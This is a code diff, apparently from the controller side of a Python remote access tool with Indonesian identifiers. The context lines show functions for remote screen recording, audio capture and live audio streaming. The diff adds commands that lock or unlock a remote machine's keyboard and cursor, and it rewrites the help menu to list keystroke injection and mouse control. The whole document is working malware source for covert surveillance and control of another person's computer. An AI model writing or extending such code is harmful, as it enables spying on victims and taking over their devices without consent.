@@ -258,7 +258,6 @@ def screen_record(host="0.0.0.0", port=9999):
     conn.close()
     cv2.destroyAllWindows()
 
-
 def konversi_byte_stream():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.bind(('0.0.0.0', 9998))
@@ -329,6 +328,25 @@ def do_streaming_audio():
         stream.stop_stream()
         stream.close()
         p.terminate()
+
+def ui(sok, cmd):
+    cmd = cmd.strip()
+
+    if cmd == "ui unlock cursor":
+        send_format(sok, "unlock cursor")
+
+    elif cmd == "ui lock cursor":
+        send_format(sok, "lock cursor")
+
+    elif cmd == "ui unlock keyboard":
+        send_format(sok, "unlock keyboard")
+
+    elif cmd == "ui lock keyboard":
+        send_format(sok, "lock keyboard")
+
+    else:
+        print("use lock/unlock for cursor/keyboard event")
+        send_format(sok, "invalid")
 
 def data_diterima(_target):
         data = ''
@@ -437,12 +455,11 @@ def shellc(_target):
                       -rec_audio >> record audio for 20 sec and save it in disk
                       -live_audio >> stream audio without saving it
                     
-                    -send_key  >> type keyboard remotely
-
-                    -cursor:
-                      -move x,y >> move cursor to specific coordinate
-                      -rclick   >> do right click
-                      -lclick   >> do left click
+                    -ui:
+                      -disable/enable cursor/keyboard
+                      -send_key >> inject keystroke
+                      -move x, y >> move cursor
+                      -lclick/rclick >> cursor click event
                     ================================ 
 
                         execution:
@@ -480,6 +497,8 @@ def shellc(_target):
                 send_format(_target, "lclick")
             elif perintah == "getpid":
                 recv_status(_target)
+            elif perintah.startswith("ui"):
+                ui(_target, perintah)
             else:
                 hasil = data_diterima(_target)
                 print(hasil)
